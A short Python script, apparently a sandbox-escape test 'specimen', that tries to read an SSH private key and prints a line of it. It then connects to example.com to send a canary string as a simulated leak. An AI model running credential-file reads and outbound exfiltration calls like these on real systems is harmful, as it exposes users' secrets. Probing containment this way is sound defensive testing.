import os, sys
print("specimen: start", flush=True)
try:
    k = open("/home/.ssh/id_ed25519").read().strip()
    print("specimen: READ KEY ->", k.splitlines()[1], flush=True)
except Exception as e:
    print("specimen: key read FAILED ->", type(e).__name__, e, flush=True)
try:
    import socket
    s = socket.create_connection(("example.com", 80), timeout=5)
    s.sendall(b"GET /?leak=CANARY-7f3a91 HTTP/1.0\r\nHost: example.com\r\n\r\n")
    print("specimen: CONNECTED + SENT", flush=True)
except Exception as e:
    print("specimen: connect FAILED ->", type(e).__name__, e, flush=True)
print("specimen: still alive at end", flush=True)
